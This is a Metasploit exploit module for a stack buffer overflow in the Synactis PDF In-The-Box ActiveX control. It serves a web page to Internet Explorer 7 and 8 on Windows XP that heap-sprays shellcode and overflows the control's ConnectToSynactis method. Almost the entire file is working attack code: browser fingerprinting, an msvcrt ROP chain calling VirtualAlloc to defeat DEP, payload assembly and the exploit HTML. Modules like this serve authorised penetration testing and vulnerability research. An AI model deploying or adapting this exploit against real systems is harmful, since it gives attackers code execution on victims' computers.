##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
#   http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = NormalRanking

	include Msf::Exploit::Remote::HttpServer::HTML
	include Msf::Exploit::RopDb
	include Msf::Exploit::Remote::BrowserAutopwn

	autopwn_info({
		:ua_name    => HttpClients::IE,
		:ua_minver  => "7.0",
		:ua_maxver  => "8.0",
		:javascript => true,
		:classid    => "{C80CAF1F-C58E-11D5-A093-006097ED77E6}",
		:method     => "ConnectToSynactis",
		:os_name    => OperatingSystems::WINDOWS,
		:rank       => AverageRanking
	})

	def initialize(info={})
		super(update_info(info,
			'Name'           => "Synactis PDF In-The-Box ConnectToSynactic Stack Buffer Overflow",
			'Description'    => %q{
					This module exploits a vulnerability found in Synactis' PDF In-The-Box ActiveX
				component, specifically PDF_IN_1.ocx.  When a long string of data is given
				to the ConnectToSynactis function, which is meant to be used for the ldCmdLine
				argument of a WinExec call, a strcpy routine can end up overwriting a TRegistry
				class pointer saved on the stack, and results in arbitrary code execution under the
				context of the user.

					Also note that since the WinExec function is used to call the default browser,
				you must be aware that: 1) The default must be Internet Explorer, and 2) When the
				exploit runs, another browser will pop up.

					Synactis PDF In-The-Box is also used by other software such as Logic Print 2013,
				which is how the vulnerability was found and publicly disclosed.
			},
			'License'        => MSF_LICENSE,
			'Author'         =>
				[
					'h1ch4m',
					'sinn3r'  #Metasploit
				],
			'References'     =>
				[
					[ 'OSVDB', '93754' ],
					[ 'EDB', '25835' ]
				],
			'Platform'       => 'win',
			'Targets'        =>
				[
					# Newer setups like Win + IE8: "Object doesn't support this property or method"
					[ 'Automatic', {} ],
					[
						'IE 7 on Windows XP SP3', {'Eax' => 0x0c0c0c0c}
					],
					[
						# 0x20302020 = Where the heap spray will land
						# 0x77c15ed5 = xchg eax,esp; rcr dword ptr [esi-75], 0c1h, pop ebp; ret 4
						'IE 8 on Windows XP SP3',
						{ 'Rop' => :msvcrt, 'Pivot' => 0x77C218D3, 'Ecx' => 0x20302024, 'Eax' => 0x20302028 }
					]
				],
			'Payload'        =>
				{
					'BadChars'        => "\x00",
					'StackAdjustment' => -3500
				},
			'DefaultOptions' =>
				{
					'InitialAutoRunScript' => 'migrate -f'
				},
			'Privileged'     => false,
			'DisclosureDate' => "May 30 2013",
			'DefaultTarget'  => 0))
	end

	def get_target(agent)
		return target if target.name != 'Automatic'

		nt = agent.scan(/Windows NT (\d\.\d)/).flatten[0] || ''
		ie = agent.scan(/MSIE (\d)/).flatten[0] || ''

		ie_name = "IE #{ie}"

		case nt
		when '5.1'
			os_name = 'Windows XP SP3'
		end

		targets.each do |t|
			if (!ie.empty? and t.name.include?(ie_name)) and (!nt.empty? and t.name.include?(os_name))
				return t
			end
		end

		return nil
	end

	def get_payload(t, cli)
		code = payload.encoded

		case t['Rop']
		when :msvcrt
			print_status("Using msvcrt ROP")
			align  = "\x81\xc4\x54\xf2\xff\xff" # Stack adjustment # add esp, -3500
			# Must be null-byte-free for the spray
				chain =
				[
					t['Pivot'],
					0x41414141,
					t['Ecx'],   # To ECX
					0x77c1e844, # POP EBP # RETN [msvcrt.dll]
					0x41414141,
					0x77c1e844, # skip 4 bytes [msvcrt.dll]
					0x77c4fa1c, # POP EBX # RETN [msvcrt.dll]
					0xffffffff,
					0x77c127e5, # INC EBX # RETN [msvcrt.dll]
					0x77c127e5, # INC EBX # RETN [msvcrt.dll]
					0x77c4e0da, # POP EAX # RETN [msvcrt.dll]
					0x2cfe1467, # put delta into eax (-> put 0x00001000 into edx)
					0x77c4eb80, # ADD EAX,75C13B66 # ADD EAX,5D40C033 # RETN [msvcrt.dll]
					0x77c58fbc, # XCHG EAX,EDX # RETN [msvcrt.dll]
					0x77c34fcd, # POP EAX # RETN [msvcrt.dll]
					0x2cfe04a7, # put delta into eax (-> put 0x00000040 into ecx)
					0x77c4eb80, # ADD EAX,75C13B66 # ADD EAX,5D40C033 # RETN [msvcrt.dll]
					0x77c14001, # XCHG EAX,ECX # RETN [msvcrt.dll]
					0x77c3048a, # POP EDI # RETN [msvcrt.dll]
					0x77c47a42, # RETN (ROP NOP) [msvcrt.dll]
					0x77c46efb, # POP ESI # RETN [msvcrt.dll]
					0x77c2aacc, # JMP [EAX] [msvcrt.dll]
					0x77c3b860, # POP EAX # RETN [msvcrt.dll]
					0x77c1110c, # ptr to &VirtualAlloc() [IAT msvcrt.dll]
					0x77c12df9, # PUSHAD # RETN [msvcrt.dll]
					0x77c35459  # ptr to 'push esp #  ret ' [msvcrt.dll]
				].pack("V*")

				p = chain + align + code

		else
			p = "\x0c" * 50 + code
		end

		p
	end

	def get_html(cli, req, target)
		js_p = ::Rex::Text.to_unescape(get_payload(target, cli), ::Rex::Arch.endian(target.arch))
		eax  = "\\x" + [target['Eax']].pack("V*").unpack("H*")[0].scan(/../) * "\\x"

		html = %Q|
		<html>
		<head>
		<script>
		#{js_property_spray}

		function r()
		{
			var s = unescape("#{js_p}");
			sprayHeap({shellcode:s});

			var p1 = '';
			var p2 = '';
			eax = "#{eax}";

			while (p1.length < 189)  p1 += "\\x0c";
			while (p2.length < 7000) p2 += "\\x0c";

			var obj = document.getElementById("obj");
			obj.ConnectToSynactis(p1+eax+p2);
		}
		</script>
		</head>
		<body OnLoad="r();">
		<OBJECT classid="clsid:C80CAF1F-C58E-11D5-A093-006097ED77E6" id="obj"></OBJECT>
		</body>
		</html>
		|

		html.gsub(/^\t\t/, '')
	end

	def on_request_uri(cli, request)
		agent = request.headers['User-Agent']
		uri   = request.uri
		print_status("Requesting: #{uri}")

		target = get_target(agent)
		if target.nil?
			print_error("Browser not supported, sending 404: #{agent}")
			send_not_found(cli)
			return
		end

		print_status("Target selected as: #{target.name}")
		send_response(cli, get_html(cli, request, target), {'Content-Type'=>'text/html', 'Cache-Control'=>'no-cache'})
	end
end
